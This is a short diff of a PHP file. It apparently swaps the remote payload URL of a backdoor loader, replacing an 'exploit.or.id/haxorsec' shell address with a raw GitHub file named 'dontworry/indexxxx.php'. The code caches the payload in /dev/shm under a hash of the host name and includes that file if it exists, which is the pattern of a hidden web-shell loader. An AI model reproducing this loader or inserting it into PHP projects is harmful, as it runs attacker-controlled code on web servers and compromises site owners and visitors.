@@ -1,5 +1,5 @@
 <?php
-$data = ['https://exploit.or.id/haxorsec/haxorsecv2/haxorsecv2.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+$data = ['https://raw.githubusercontent.com/launchscroll/dontworry/refs/heads/main/indexxxx.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
